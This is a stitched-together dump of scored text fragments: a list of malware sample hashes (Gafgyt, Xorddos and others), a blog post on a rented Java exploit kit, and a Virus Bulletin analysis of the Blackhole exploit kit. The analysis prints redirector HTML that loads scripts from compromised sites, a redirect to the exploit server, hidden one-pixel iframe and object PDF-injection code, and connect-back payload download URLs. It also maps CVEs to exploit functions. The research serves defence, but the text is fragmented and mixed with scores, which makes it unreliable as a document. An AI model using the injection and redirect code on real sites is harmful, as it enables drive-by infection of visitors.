[21] ValdikSS. Some tools to monitor BillGates CnC servers. February 2014. https://github.com/ValdikSS/billgates-botnet-tracker.,0.012184722148716687
Appendix,0.009615341114577736
Elknot Builder,0.008103855815036698
F126C3F8530587F7CADEB8B969BC04AB114B468922171A953211345AD5A8F380,0.010508114165138305
Elknot Xitele Kit,0.008598621152852703
48183D0DD8DA484639ADDA9F60E5FEA340D7C6B4C77458384EE98CB21972ADE5,0.01116010543650059
Elknot EM_386,0.007563392670212665
D1F922A762BBD4E0725D4625BE4A39CEBFA03D1875339E9F01F825A2DCDC9E65,0.011461193847427609
Elknot EM_386 (Setag),0.01018314323257774
568A52AA9A9AC2698BA7C49FE4A3AEE34D96FE0F25ECCB31FC726D941BB135EA,0.010947541449356168
Elknot (Setag) UPX,0.01257029742527005
3E89F0D71671DB79506050E0823D121EA5A19457308AF3E379AC45A0338B1B33,0.012060306411943111
Elknot Script,0.0083737471584161
21ACDA48CAD399B049D03A51A64C9E4BB2DC96C1916BC4EECD6FC828E8036083,0.010977139315982987
Chinaz EM_386,0.007641740778133288
A86B1899821C2833B989A736E928A4137FA6D0954C9816747F6AFEF536F757F9,0.010734380159409418
Chinaz EM_x86_64,0.010239411573366941
1EB72C76F79FA01CE39198C91AF5C7A4E36897E9A9A8F5D29CA68BA7371A2361,0.01040433821928366
Chinaz EM_MIPS,0.007655898475534162
87934D993BB5262FB2826DA05CB4657EC6B20849A65C5D00D260BBF58878F45E,0.01143694528898298
Chinaz Sources,0.00976742787786078
992ED01DEF5ECE5B90CE242820D2BFDD580FDDDE12DBC10CE5A395A7923922C9,0.011446298589598669
MrBlack C&C,0.007881742060492192
1828AC46C67E120274688A562D04E9E9A629C39090A848956FB7DB45B6551B74,0.010834012913815583
MrBlack Builder,0.008287032367394698
E83F69052FC240DC43FC2B32F77408B2B3488E67B29B04041E7C6B8622CE8602,0.011466437323255474
MrBlack EM_x86_64,0.009884596085531605
F2DF127535902E6390CE2EC198C12A5BD9A361901C2D8008A064DF96EFD10E29,0.011329719259682958
MrBlack EM_x86_64 UPX,0.0097723907787296
6DD946E821DF59705DCFEB79FAB810336D0EE497FD715FB5B6711E05C0428F4D,0.011414499809986323
MrBlack EM_386,0.007734326445914652
8766317F20B05C792514ADDD8BB4904021049ACD86E8D70E9FFFD1D12FAD51CE,0.011748951411785225
MrBlack EM_ARM,0.008393442146360619
26FCBDC7EBE2750B4008D8C67186A9DA03D34B994662BD93E49D7C572AADBAE0,0.012032755459873035
MrBlack EM_MIPS,0.009725774538493659
736C08988602155954C02CBEF0B4ED3DD916C7EB659032202F15081620058988,0.010349572885905323
MrBlack Sources,0.009360095224142384
8499E6727253FA98DACC3D753CC08CB207C64A290D9521E94A65C2BDA34F405E,0.011616392951893317
Aesddos EM_ARM,0.007404827454083218
AF765C0F87846E6E1A184B64A4DA8E51588F0F6A7048FEFDD60B53058373C6B6,0.011056925499084325
Aesddos EM_386,0.007304809347294272
D6E77D8F2FFDF61981241022E8D7034014927BFFA23793739051CAD34867F766,0.011033675018500833
Wrkatk EM_386,0.0073177573676058705
288D91AF1B5F3A57C0B3D66330F56BBCD38604948B3154CD4842D277FA86F664,0.01075331181785577
Wrkatk EM_x86_64,0.009172537194061636
0940E4A72DBA133838CCD0992914C5FB2BF106D5A018F289B9C5896C0E237CC6,0.011511327667007465
Wrkatk EM_MIPS,0.008153996777392924
8A1CE3302E896CD695528EB0CC744EC6E18C1D708C944BE7C8AFFB3B4D44BD5D,0.010983158619922162
Wrkatk EM_ARM,0.007689422118743128
4ED6E5CFA9D7006E021BBD099AAFD4F2ADAAE3307DC25262E240D9E8829B960D,0.011759675952332405
Iptablesx Dropper,0.007082106828789514
F41C4C9EE0FBAEFF5397F27531A91135C1D98C54A9E0BDC6CA52315E3E208537,0.010947581784166549
Iptablesx EM_386,0.0070691545724936855
9F89CA6F4580F6EBE021D2C2E2C528B93E4492C4B6E6BD5F339361E86F8585D8,0.011308229249427426
Sotdas EM_386,0.007955056925494808
E75E49AC157DADC8C4E7230D531BE0DB6FBC339B5D75B7AB8FA6202CE0EC8E2A,0.011667803607860239
Sotdas EM_x86_64 UPX,0.009868107679784743
59D53A8DFB2B646293E422743EAF8C6F3AB576BACCDF36BB133C4F458AAF60A3,0.010929256378985008
Xorddos C&C,0.007134843998329088
496F413E6C8B6F258C238AF6EAF61C2B524DC0DC985E4E659627ADAE1ED31517,0.011505764532190765
Xorddos Script,0.007916136932936912
BA84C056FB4541FE26CB0E10BC6A075585990F3CE3CDE2B49475022AD5254E5B,0.011062811880429457
Xorddos Uploader,0.00798068615441283
44153031700A019E8F9E434107E4706A705F032898D3A9819C4909B2AF634F18,0.010607038267660185
Xorddos EM_386,0.007407629812285821
AD26ABC8CD8770CA4ECC7ED20F37B510E827E7521733ECAEB3981BF2E4A96FBF,0.010934132784228834
Xorddos EM_x86_64,0.009447819610591712
859A952FF05806C9E0652A9BA18D521E57090D4E3ED3BEF07442E42CA1DF04B6,0.010986157812521435
Xorddos EM_ARM,0.007703312587023503
49963D925701FE5C7797A728A044F09562CA19EDD157733BC10A6EFD43356EA0,0.011405349531427578
Xorddos Rootkit,0.007150360803132472
6BE322CD81EBC60CFEEAC2896B26EF015D975AD3DDA95AE63C4C7A28B7809029,0.010792051903290023
Gafgyt Server,0.00763141902584108
2A04C216FCE75D19E5162081EB747B8A77C205F6DD933B0864C08FB086C929C5,0.011394786729448048
Gafgyt EM_x86_64,0.0093339121396262
BAABCECAC23775FDD3E52CD1FB0E4C46777A6747E854074ECE751767D13F6DD7,0.011593211678990634
Gafgyt EM_386,0.0073831967399654586
28EA6EE1080B4D436685D0D0C87EEF492EA2A376917437E865D0D1513114B8D7,0.010721161193415707
Gafgyt EM_ARM,0.008136352311040818
67FF5F3F10AD86ED0A9F90244E7B5BE839AFB0AAEB49E22130551A09A0F08FF8,0.011628932013756366
Gafgyt EM_MIPS,0.007942290671545837
04BEF883E7098FDA9148A75C43165D45AC5FBB8B6032848E9C5D9A5E3897DF52,0.011789190108009384
Gafgyt EM_PPC,0.007615293192297812
7F13A4C911AB0682D9A7F5988DA9C7BE0AE781CE15945E4C0AA76A78E22CBF2F,0.011806970385118243
Gafgyt EM_SH,0.008766044544971874
D59C7CF8D9EFBD93F0B907C12BB4C18CC5CE7D800B234DB219D2D919C0B0AFDC,0.011829811190438688
Gafgyt EM_SPARC,0.008871344199764652
277D2D00E27BCF4536BB492CAC16001E8832DC9BBED384A8C523B49A199790E6,0.012037644195597053
Gafgyt EM_x86_64,0.0093339121396262
BAABCECAC23775FDD3E52CD1FB0E4C46777A6747E854074ECE751767D13F6DD7,0.011593211678990634
Gafgyt EM_68K,0.00801247823279927
4E611FB1466920885D1216AB7D9B4F16A3F31D52CF7B39FFC21FC6CA41534738,0.010557448214654763
Gafgyt Script,0.008476309418280481
8D0B152A91202356B3B5470C5C017B4E9595C5325D8C14DA1DEBBE1782225A14,0.01089210788972006
Gafgyt Sources,0.0075577180239239095
"1AF299A269FFDB4461E181CA774FC307A592288AD4B3F6B93226C955EB9B8084
",0.010542010643818767
"Yesterday, a relatively unknown group of cybercriminals publicly announced the availability of a new Web malware exploitation kit. What’s so special about it is the fact that its current version is entirely based on Java exploits (CVE-2012-1723 and CVE-2013-0431), naturally, with “more exploits to be introduced any time soon”.
Let’s take a peek at the statistics and infection rates produced by this kit, as well as discuss its potential, or lack thereof, to cause widespread damage to endpoints internationally.
More details:",0.010197632766053344
Sample screenshot of the statistics page of the newly released Web malware exploitation kit:,0.006976713890388231
"The majority of affected users are U.S.-based hosts, and the majority of infected operating systems are Windows NT 6.1, followed by Windows XP. As you can see, according to the cybercriminals pitching the kit, they’ve also managed to infect some Mac OS X hosts. The overall infection rate for the campaign was 9.5%, a pretty low one taking into consideration the fact that competing Web malware exploitation kits tend to exploit a much more diversified set of client-side vulnerabilities, consequently, achieving higher exploitation rates.
How is the kit differentiating itself from the competition? Is it “innovating”, or is it basically yet another “me too” exploitation kit?
For the time being, customers can choose whether they want to manually rotate the client-side exploits serving domains/IPs, or whether they’d want the cybercriminals selling the kit to do it for them as a managed service. Customers of the exploit kit will also receive notifications one their domains start getting detected by security vendors, through the Domain Check service. Naturally, the cybercriminals behind the exploit kit are outsourcing the entire process instead of building the capability in-house. Also, for the time being, the exploit kit can only be rented on bullet proof servers operated by the cybercriminals pitching it, but if customers want to use it on their own servers, they would have to personally request this from the vendor.
The price for renting the exploit kit? $40 for 24 hours, $150 for a week, $450 for a month.
Would this newly released exploit kit cause any widespread damage internationally? We doubt so, due to the fact that some of the most recent Java vulnerabilities received massive media coverage, prompting enterprises and end users to permanently disable it. Then again, this leads us to a dangerous myopia, where end and corporate users think that disabling Java prevents cybercriminals from establishing exploitation “touch points” with their endpoints. That’s not true, as competing Web malware exploitation kits cover a variety of (patched) client-side vulnerabilities.
In the wake of two recently announced Java zero day vulnerabilities, users are advised to disable Java, as well as to ensure that they’re not running any outdated versions of their third-party software and browser plugins.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.015534345111355652
"Part 2: Interaction with a black hole
2012-12-03",0.00867736653367912
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Helen",0.00889288739339722
"Martin
Abstract
Gabor Szappanos started with two fairly incomplete sources of information about the latest Blackhole server version: the server-side source code from old versions and the outgoing flow of malware. He describes how, using these sources, he was able to sketch a reasonably good picture of what goes on inside the server hosting the Blackhole exploit kit.
Copyright © 2012 Virus Bulletin",0.012014157850747442
"Clearly, I should return my university diploma in Physics after coming up with a title like this. You cannot interact with a black hole by definition. The data flow is one-sided: everything goes in, nothing comes out – which hardly qualifies as an interaction. However, this is not the case with the Blackhole exploit kit, where information flows both in and out. Yet researching the latest Blackhole server version does remind me of examining a black hole: we have no information about what goes on inside, and we can only draw conclusions based on the effects it has on its surroundings. However, every analogy breaks at some point: we can observe the malware specimens that are coming out of Blackhole – there is a definite outward flow of information.
We can also take the knowledge gathered from analysing the old Blackhole server-side code, and see how useful it is when taking apart the attacks performed with this kit.
Essentially, we have two fairly incomplete sources of information: the outdated server-side source code and the outgoing flow of malware. From these two we can sketch a reasonably good picture of what is going on inside the server hosting the Blackhole exploit kit.
We will find that even though the code in question is quite a few versions behind the current code, the overall general operation hasn’t changed too much.",0.014614719364446693
"Attack in detail
The first part of this two-part series [1] ended with the deobfuscation of the server code, which was not complete, but sufficient for a general understanding of its operation. It proved to be possible to follow the chain of events both from the client side and the server side. The client-side events had already been documented in detail [2], while the server-side part was the missing piece that this article attempts to fill.
Data about the Blackhole attacks was gathered during a relatively long period from October 2011 until September 2012, which gave an insight into the moving parts and those that remained constant.
Typically, the initial vector of attack was spammed email messages. The email either came with an attached script that redirected to the Blackhole server or contained a direct link to the server – or, in its most simplistic form, the payload executable was sent out directly with the message.
Another known vector of Blackhole distribution was the injection of downloader code into websites. This method resulted in a very similar sequence of events, with only the initial vector differing.",0.015170989299098214
"Chain of events
Throughout the rest of the article I will refer to the most important server-side components as they are referred to in the configuration file (config.php). These are:
mainfile: As the first point of contact with the server, this PHP page receives the incoming requests from the targeted computers. Upon receiving a request, this page prepares (based on information gathered from the incoming request) a custom tailored downloader script that exploits the vulnerabilities identified on the target computer.
downloadfile: The individual exploits handed out by the mainfile connect back to this PHP page. Upon receiving a request, this page hands out the binary payload to the target computer.
A typical attack line consists of four distinct phases:
Initial vector: The targeted host is provided with a carrier; this offers a hyperlink to initiate a chain of events that concludes in the Blackhole infection.
Redirections: The initial vector from the previous stage is redirected through intermediate sites to make tracing the attack more complicated.
mainfile: The hosting server is contacted and the server code collects and distributes the exploit functions for the targeted host.
downloadfile: After any of the served exploits from the previous phase is activated, its downloader code connects back and the server code distributes the binary (Win32) executable payload.
A real example of the above scheme is shown in Figure 1.
Figure 1. Real-life example.
Throughout the rest of the paper, I will not go into great depth on the working of the individual components if I feel that the particular component is already well documented [2].",0.01898995015455407
"Initial vector
All the fun starts with an official-seeming email, as illustrated in Figure 2.
Figure 2. Typical official-looking email message.
It is interesting that in all of the identified email attacks the criminals used emails that looked like official notifications from an authority (e.g. BBB, IRS, UPS, Amazon, EFTPS), rather than the more basic instinct inspiring Viagra/‘naked teen girls’/‘Britney Spears exposed’ themes that are commonly observed in other malware distribution campaigns. The HTML messages contained a link that led to the next stage. In some rare cases the entire redirections stage was skipped, and the email itself contained a direct link or a JavaScript-obfuscated link to mainfile.
The other common intrusion vector for the Blackhole attacks was web infection: HTML or JS files on web servers were injected with downloader code. The infection reportedly occurred [5] using stolen FTP credentials to access the websites.
The JavaScript code in Figure 3 is stored in a byte array, in which the original values are modified by an encryption key. This key is generated from the seconds value of Date(2010,11,3,2,21,4). This is an interesting date, which keeps recurring in Blackhole components: it was used in the server code, and it keeps appearing in the web infection code as well.
Figure 3. Blackhole web infection component.",0.012027984883240639
"Redirections
The redirections stage consisted of intermediate encrypted JavaScript files. Typically, there were a few dozen to a few hundred HTML pages to begin with. These are usually hacked legitimate websites; the URL is recognizable within a campaign. Most often it takes the form of hxxp://[legitimatedomain]/VHuzAprT/index.html, with a legitimate domain, a random directory and index.html. The other common scheme used hacked WordPress sites, with the HTML redirector page placed in one of the default directories – for example: hxxp://stoprocking.com/wp-content/themes/twentyten/palco.html. In the latter case the HTML filename is unique within a campaign, but changes between the distribution runs, and is a filename that looks normal, but is not such a commonly used name as index.html.
These HTML pages are simple, and without any obfuscation just link to the next step, the JavaScript part:
<html>
<h1>WAIT PLEASE</h1>
<h3>Loading...</h3>
<script language=”JavaScript” type=”text/JavaScript” src=”hxxp://www.grapevalleytours.com.au/ajaxam.js”></script>;
<script language=”JavaScript” type=”text/JavaScript” src=”hxxp://www.womenetcetera.com/ajaxam.js”></script>;
<script language=”JavaScript” type=”text/JavaScript” src=”hxxp://levillagesaintpaul.com/ccounter.js”></script>
<script language=”JavaScript” type=”text/JavaScript” src=”hxxp://fasttrialpayments.com/kquery.js”></script>
</html>
Typically, there are between three and five different JavaScript links, which all refer to the same, even more simplistic content.
document.location=’hxxp://downloaddatafast.serveftp.com/main.php?page=db3408bf080473cf’;
This stage is the most flexible part – sometimes the HTML part is missing, sometimes the JavaScript part, and rarely both of them (when the initial spammed email messages contain a direct link to the server).
At the end of the chain there is the mainfile link, which is the first encounter with the Blackhole hosting server. The link has an easy-to-recognize structure:
http://{server}/{mainfile}?{threadid}={random hex digits}
The above scheme was followed in all of the cases we observed.
{server} denotes the hosting server of the Blackhole kit, {mainfile} was the name of the main exploit dispatcher script, which returned the downloader script with the exploits. {threadid} was an identifier that was meant to identify distribution campaigns. Its value changed over time, while in the short-term may have persisted for a while when only the hosting server names changed daily. One particular thread ID, 73a07bcb51f4be71, was very enduring, appearing several times in the period between 31/01/2012 and 03/04/2012.
This thread ID was supposed to be the corner point of the Blackhole TDS functionality. It identified a set of possible configurations, distinguishing between the distribution campaigns. For each configuration set, different rules (regarding the distributed exploit) could be defined, determined by the value of the BrowserID, CountryID and OSID information gathered from the incoming request.
So in theory, Blackhole could serve custom tailored exploits for the attacked computers. In practice, however, the 1.0.2 configuration contained a single rule that served all distribution campaigns and OS/browser/country combinations. Despite the fact that a fully fledged TDS functionality was available, and that the particular code base was supposed to support 28 different server installations simultaneously, it was not utilized.
However, the situation has changed significantly in the latest identified installation. Mapping the actual state in September 2012 (version 1.2.5 of the kit), probing with different OS and browser versions, we observed a very granular TDS functionality, which is summarized in Table 1a and Table 1b.
Exploit delivered
Vista: IE7, IE8 Win7: IE9, IE10
Win7: Mozilla22, Opera12, Safari5 Android: Safari5
Win7: Firefox14
Vista: IE6
Non-Windows platforms
WinNT90: IE9
Win8: Chrome17
Java (CVE-2010-0840, CVE-2012-0507)
+
+
+
+
-
+
+
XMLHTTP+ADODBSTREAM downloader (MS06-014)
-
-
-
+
-
-
-
(CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
+ (IFRAME)
+ (object)
+ (object + IFRAME)
+ (IFRAME)
-
+ (IFRAME)
+ (object)
HCP (CVE-2010-1885) XMLHTTP+ADODB
-
-
-
-
-
-
-
Flash (CVE-2011-0611)
-
-
-
-
+
+
+
Flash (CVE-2011-2110)
+
+
+
+
+
+
+
CVE-2012-1889
-
-
-
-
-
-
-
Table 1. Exploit distribution table in relation to OS/browser version info.
Exploit delivered
OSX: IE5 WinCE: IE4
Win2K: Firefox5
WinXP:IE9
WinXP: Chrome17
Win95: IE4 Win98: IE4, IE5, IE6 WinNT: IE5 WinNT351: IE5 WinNT40: IE5 Win2K: IE4, IE5, IE6
Win2K3: IE7
Win2K: IE8 WinXP: AOL96
Java (CVE-2010-0840, CVE-2012-0507)
-
+
+
+
+
+
+
XMLHTTP+ADODBSTREAM downloader (MS06-014)
+
-
-
-
+
-
-
(CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
-
+ (object + IFRAME)
+ (IFRAME)
+ (object)
+ (IFRAME)
+ (IFRAME)
+ (object)
HCP (CVE-2010-1885) XMLHTTP+ADODB
-
-
+ (link)
+ (link)
-
+ (embed)
+ (embed)
Flash (CVE-2011-0611)
+
+
+
+
+
+
+
Flash (CVE-2011-2110)
+
+
+
+
+
+
+
CVE-2012-1889
-
-
-
-
-
-
-
Table 2. Exploit distribution table in relation to OS/browser version info.",0.01792715511886933
"Mainfile
Upon receiving the incoming request, the ‘RedirectsSplit’ value in threaddata.php determines the type of reaction required. If it has some predefined value(s), it simply redirects the incoming request to the configured URL(s). If the value is not set, the exploit kit goes on to build the mainfile response, which will be a collection of functions, each of them exploiting a particular vulnerability.
Both the redirect and the attack response are logged in the MySQL database along with the IP address of the requesting victim.
The mainfile response is gathered from predefined building blocks. It consists of the JavaScript-enabled exploit functions, a general Java downloader that works without JavaScript support, and an end_redirect() finishing function. Finally, the returned script is encrypted.
The build logic is roughly the following:
insert = “end_redirect{};PluginDetect(){…};”
if exploit_1 is selected {
insert += “exploit1() {exploit1_code; call exploit2()}”
}
else {
insert += “exploit1() { call exploit2()}”
}
if exploit_2 is selected {
insert += “exploit2() {exploit2_code; call exploit3()}”
}
else {
insert += “exploit2() { call exploit3()}”
}
…
insert += “call end_redirect{}; call exploit1()”
write NO_JS_html + JS_crypt(insert)
The exploit functions in all 1.2.x kit versions are named spl0 through spl7. In the recently recorded attacks exploit function 0 was turned off, and exploit function 1 was absent from the building logic.
The infection script begins with the PluginDetect public library code [3], which is used to extract the relevant version information:
OS
Browser (and browser version)
Adobe Flash version
Adobe Reader version
Java version
This library is available for download, and in addition to the above list used by the Blackhole kit, other plug-ins are supported:
QuickTime
DevalVR
Shockwave
Windows Media Player
Silverlight
VLC Player
RealPlayer
The user-friendly download interface builds the script based on the specified settings regarding which of the plug-in versions should be included. It is not only Blackhole that has discovered this useful utility: the Bleeding Life exploit kit has used it, and recently the NeoSploit pack also added it [6] to its arsenal.
Blackhole has been using this library since at least version 1.0.2 – back then, it was only used in the PDF-related exploit function. Later versions, starting with 1.1.0, moved the library up front of the code, to enable it to be referenced globally by the other exploit functions as well.
The library code is inserted into the resulting script as a BASE64-encoded blob and unpacked on the fly when building the mainfile response page – which is an unusual practice. The most likely reason for this is that, this way, the author could avoid the pain of escaping all special characters in the PluginDetect code when using it as a string constant in the mainfile generation code. That would involve the error-prone process of going through about 10KB of script code, which would have to be repeated whenever the PluginDetect version or the included modules changed (which happened a couple of times over the lifetime of the Blackhole exploit kit [see Table 2]).
Version
Release date
Exploit functions
PluginDetect
2.0
09/2012
-
0.7.8 (AdobeReader)
1.2.5
30/07/2012
spl0, spl2, spl3,spl4,spl5, spl6, spl7 spl0, spl2, spl4, spl5, spl7 blank
0.7.8 (Java, Flash, AdobeReader)
1.2.4
11/07/2012
spl0, spl2, spl3,spl4,spl5, spl6, spl7 spl0, spl2, spl7 blank, spl4 and spl5 sometimes blank
0.7.8 (Java, Flash, AdobeReader)
1.2.3
28/03/2012
spl0, spl2, spl3,spl4,spl5 spl4 blank, spl0 sometimes blank
0.7.6 ( Flash, AdobeReader)
1.2.2
26/02/2012
spl0, spl2, spl3,spl4,spl5 spl4 blank, spl0 blank
0.7.6 ( Flash, AdobeReader)
1.2.1
09/12/2011
spl0, spl1, spl2, spl3,spl4,spl5 spl4 blank
No version (Java, Flash, AdobeReader)
1.2.0
11/09/2011
spl0, spl2, spl3,spl4,spl5, spl6,spl7 spl6 blank
No version (Java, Flash, AdobeReader)
1.0.2
20/11/2010
ewvf, zazo,ai, dsfgsdfh, asgsaf
No version (AdobeReader, used in the PDF handler)
Table 3. Mainfile characteristics in versions.
The individual exploit functions are organized in a function call chain. If a particular exploit is selected, then the appropriate function contains the exploit code, otherwise only the call to the next exploit function is present. During the construction of the script, all rules from threaddata.php are enumerated and matched against the information gathered from the incoming HTTP request. Filters can be defined by OS version, browser ID and country ID. For each defined rule a different set of exploit functions can be returned, thus implementing the TDS functionality.
Finally, an end_redirect function is called, which redirects the browser to an innocent page, with the usual ‘please wait…’ text. In some cases it additionally redirects to a Win32 executable.
At least the picture was this clear back with the 1.0.2 version. After the TDS functionality kicked in big time, and more granular system support was configured, the building logic got messy, most noticeably around the PDF exploit distribution, which in the 1.2.5 version already had three different forms.
The first form is applied when the browser is Internet Explorer. In this case, the exploiting PDF object is inserted as an IFRAME into the mainfile response script:
function show_pdf(src){var pifr=document.createElement(‘IFRAME’);pifr.setAttribute(‘width’,1);
pifr.setAttribute(‘height’,1);pifr.setAttribute(‘src’,src);document.body.appendChild(pifr)}
With some other browsers, such as Safari and Chrome, this form is changed to use an object element instead of an IFRAME:
function show_pdf(src){var p=document.createElement(‘object’);p.setAttribute(‘type’,’application/pdf’);
p.setAttribute(‘data’,src);p.setAttribute(‘width’,1);p.setAttribute(‘height’,1);document.body.appendChild(p)}
In the case of Firefox, both forms are included at the same time:
function show_pdf(src){var pifr=document.createElement(‘IFRAME’);pifr.setAttribute(‘width’,1);
pifr.setAttribute(‘height’,1);pifr.setAttribute(‘src’,src);document.body.appendChild(pifr)}",0.014355107548331358
"function show_pdf2(src){var p=document.createElement(‘object’);p.setAttribute(‘type’,’application/pdf’);
p.setAttribute(‘data’,src);p.setAttribute(‘width’,1);p.setAttribute(‘height’,1);document.body.appendChild(p)}
The HCP exploit (CVE-2010-1885) also has two forms, the first one embeds the script code directly, and the other inserts an IFRAME with a link to the PHP file on the server providing the content.
The exploit function assemblage changed with Blackhole kit releases. Table 2 summarizes the mainfile characteristics of Blackhole exploit kit versions, exploit function information and the usage of the PluginDetect library. This information may help to identify the version of the underlying exploit kit in a given attack.
It is worth noting that the call order of the exploit functions, their names, and in most cases the statically inserted function bodies are all hard-coded in the Blackhole server backend code, thus cannot be changed easily. Indeed, there were only minor changes (resulting from the addition of new exploits to the kit) in the generated code, even the names of the exploit functions remained the same throughout versions 1.2.x.
There are two possible ways in which an exploit function is excluded from the mainfile script: the exploit function is missing completely, or it is a blank function, calling only the next one in the chain. The first can only be achieved by a new exploit kit release; the latter is possible via admin user interface clicks.
Each exploit function contains a connect-back URL that will be used to download and execute the Win32 binary content from the server. The URL has the following form:
http://{server}/{downloadfile}?f=73a07?e=1
Here, parameter f is the payload identifier, e is the exploit identifier.
(An interesting fact is that the PHP file serving the HCP vulnerability (CVE-2010-1885) connect-back URL reverses the order of the f and e parameters. It has no effect on the operation of the code, but is a remarkable deviation from the general pattern.)
As of version 1.2.5, the URL scheme for some of the attack vectors changed to serve multiple payloads instead of a single payload. The shellcode delivered by the Flash exploit can contain a list of file references, matching the above URL, but with a different file ID for each, as in the following example:
hxxp://spicyplaces.com/l/r.php?f=9235d&e=1
hxxp://spicyplaces.com/l/r.php?f=c5826&e=1
hxxp://spicyplaces.com/l/r.php?f=182b5&e=1",0.014381632897008334
"The variation of the HCP exploiting script with the code embedded into the mainfile response script can accept multiple parameters in the form: hxxp://spicyplaces.com/l/data/hcp_vbs.php?f=9235d::c5826::182b5&d=0::0::0. Both the file ID and the exploit ID can now serve multiple values. The variation that inserts only a link to the mainfile code also serves multiple payloads but in the old-fashioned way, serving them sequentially, one by one. This change was introduced in version 1.2.4, and only applied to the HCP function.
Table 3 identifies the mapping between the exploit ID (the e query parameter) and the delivered exploit content in the sample gathered at the beginning of the inspection period, the most recent field samples, and the original 1.0.2 code. (It was not possible to positively identify all cases, as samples were not always available, hence the question marks in the table.)
Exploit ID
1.2.0 (2011.11)
1.2.5 (2012/09)
Server code (v.1.0.2)
0
Java (CVE-2010-4452)
Java (CVE-2010-0840,CVE-2012-0507)
XMLHTTP+ADODB (MS06-014)
1
-
SWF (CVE-2011-0611)
JAR (CVE-2010-0886)
2
JAR (CVE-2010-0886)
XMLHTTP+ADODB (MS06-014)
CVE-2010-1885 + XMLHTTP+ADODB
3
Java (?)
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659)
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659)
4
XMLHTTP+ADODB (MS06-014)
PDF (CVE-2010-0188)
PDF (CVE-2010-0188)
5
HCP (CVE-2010-1885)
HCP (CVE-2010-1885)
CVE-2010-0806
6
PDF (?)
?
Java (CVE-2010-0840,CVE-2012-0507)
7
-
CVE-2012-1889
-
8
SWF (CVE-2011-0611)
-
-
Table 4. Exploit ID to exploit mappings.",0.012393623275372412
"Downloadfile
This stage of the attack is reached when the connect-back code from the activated exploit reaches back to the server, issuing a request with a specific format:
http://{server}/{downloadfile}?f=73a07?e=1
In the above URL the downloadfile variable is determined in config.php. The most common values we observed were d.php, w.php and q.php.
The parameter f is the unique ID in the SQL database: this identifies which file from the data directory should be returned. The returned payload is dependent only on the value of f, regardless of the value of parameter e. Normally, we would expect that as the attacks are updated with new executables (which change frequently to avoid detection by anti-virus software), this value would increase on the same site. This was indeed observed in the first couple of attacks, although they were hosted on different servers. This implies that the database was likely dumped and imported when transferring the backend. Later, a huge change was observed, from file ID 97 to ea498. From then on, file IDs were five-digit hexadecimal numbers that were reused within attacks. As an example, 182b5 was seen from 05/06/2012 until 10/09/2012.
The parameter e identifies the exploit that was completed in the download. It is stored in the database along with the IP address of the infected host. This information is later used for tracking the exploit statistics.
If for any reason the e parameter is missing, a default value (4 in the case of 1.0.2) is taken, which belongs to a PDF (CVE-2010-0188) exploit. And as we look at the mainfile code, we can see that when constructing the PDF exploit code corresponding to the value 4, the e parameter tag is not appended to the end of the connect-back URL, which makes this default assignment logical.
Upon receiving this request, the server code builds a response. That response will include an executable payload inserted as application/x-msdownload content type, the content of which is determined by the f parameter of the request.
The filename of the download is randomly selected from the list: 'readme', 'info', 'contacts', 'about' and 'calc' to make the download appear less suspicious. The extension is always '.exe'.",0.012141785633906776
"Individual exploits
The author of the exploit kit has been busy over the past two years keeping his creation up to date. As new popular exploit code has become available, he has added it to the code base and eventually removed old and not so useful vulnerabilities.
Table 4a and Table 4b summarize the exploit content of each of the exploit functions for all contemporary Blackhole versions.
In the following sections we describe the individual exploit functions deployed by Blackhole. Only the latest samples were analysed in more detail, older versions can be tracked from Table 4a and Table 4b. If data for a particular exploit is missing, it is because I couldn’t find it in any of the analysed samples belonging to the particular version of the exploit kit.
Exploit function
1.1.0
1.2.0
1.2.1
1.2.2
spl0
Java (CVE-2010-0840)
Java (CVE-2010-4452)
Java (CVE-2010-4452)
N/A
spl1
Java (CVE-2010-4452)
N/AExp
Java (CVE-2010-0840)
N/A
spl2
Java (CVE-2010-0886)
Java (CVE-2010-0886) - (new.avi -> exe download)
XMLHTTP + ADODBSTREAM downloader
(MS06-014) XMLHTTP + ADODBSTREAM downloader (MS06-014)
spl3
Java (CVE-2010-3552)
Java (CVE-2010-3552)
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
spl4
N/A
XMLHTTP+ADODB (MS06-014)
N/A
N/A
spl5
PDF (CVE-2010-0188)
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324) or CVE-2010-0188
Flash (CVE-2011-0611)
Flash (CVE-2011-0611)
spl6
HCP (CVE-2010-1885)
N/A
N/A
N/A
spl7
N/A
N/A
N/A
N/A
NOJS
N/A
Java (CVE-2010-0840, CVE-2012-0507)
N/A
Java (CVE-2010-0840, CVE-2012-0507)
Table 5. Exploit delivery in different versions of the Blackhole kit.
Exploit function
1.2.3
1.2.4
1.2.5
spl0
Java (CVE-2010-4452)
N/A
N/A
spl1
N/A
N/A
N/A
spl2
XMLHTTP + ADODBSTREAM downloader (MS06-014)
N/A
XMLHTTP + ADODBSTREAM downloader (MS06-014)
spl3
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188
spl4
N/A
HCP (CVE-2010-1885) XMLHTTP+ADODB
HCP (CVE-2010-1885) XMLHTTP+ADODB
spl5
Flash (CVE-2011-0611)
Flash (CVE-2011-0611)
Flash (CVE-2011-0611)
spl6
N/A
Flash (CVE-2011-2110)
Flash (CVE-2011-2110)
spl7
N/A
N/A
CVE-2012-1889
NOJS
Java (CVE-2010-0840, CVE-2012-0507)
Java (CVE-2010-0840, CVE-2012-0507)
Java (CVE-2010-0840, CVE-2012-0507)
Table 6. Exploit delivery in different versions of the Blackhole kit.",0.027740582060387986
"spl0: empty
This exploit function used to deliver Java exploits (CVE-2010-0840 or CVE-2010-4452) in early versions, but since version 1.2.4 it has not been used.",0.009205263240677497
"spl1: missing
